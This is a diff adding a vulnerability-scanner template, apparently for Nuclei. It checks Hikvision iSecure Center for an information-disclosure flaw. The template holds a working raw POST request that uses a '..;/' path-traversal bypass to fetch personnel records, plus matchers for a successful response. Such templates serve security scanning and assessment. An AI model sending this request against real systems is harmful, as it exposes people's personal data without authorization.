@@ -1,0 +1,35 @@
+id: hikvision-isecure-center-person-find-info-disclosure
+
+info:
+  name: Hikvision iSecure Center person/find - Info Disclosure
+  author: qwtd
+  severity: medium
+  description: Hikvision iSecure Center person/find information disclosure vulnerability.
+  reference:
+    - https://github.com/zan8in/afrog/blob/730b60fbf4f983dc8f0cc9bbcfafab3e52b90153/pocs/afrog-pocs/vulnerability/isecure-center-leakinfo.yaml#L14
+  tags: HIKVISION-综合安防管理平台
+
+http:
+  - raw:
+      - |
+        POST /isupm/api/api/..;/..;/person/find HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=utf-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+
+        {"organizationId":"root000000","pageSize":100,"pageNo":1,"name":"","casecadeSubOrganization":1}
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code":"0"'
+          - '"msg":"SUCCESS!"'
+          - 'data'
+          - 'totalPage'
+        condition: and
